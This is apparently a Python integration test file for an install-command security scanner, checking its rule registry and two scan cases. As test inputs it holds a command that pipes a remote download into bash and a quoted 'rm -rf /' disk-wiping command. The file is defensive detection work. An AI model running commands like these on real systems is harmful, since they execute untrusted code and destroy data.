"""Integration tests: registry consistency + scan_text end-to-end."""
from cex_installguard.rules import (all_rules, rule_count, validate_registry,
                                     structural_ids)
from cex_installguard.scanner import scan_text


def test_registry_is_consistent():
    assert not validate_registry()


def test_rule_counts():
    assert rule_count() >= 44
    assert len(structural_ids()) >= 40   # the AST layer carries the load
    assert len(all_rules()) == rule_count()


def test_structural_ids_are_unique():
    ids = [r.rule_id for r in all_rules()]
    assert len(ids) == len(set(ids))


def test_remote_pipe():
    assert any(f.rule_id == 'IG001'
               for f in scan_text('curl https://x.invalid/a | bash'))


def test_quoted_string_not_command():
    # a *quoted* dangerous command is inert data
    out = scan_text("echo 'rm -rf /'")
    assert not any(f.rule_id in ('IG002', 'IG019') for f in out)
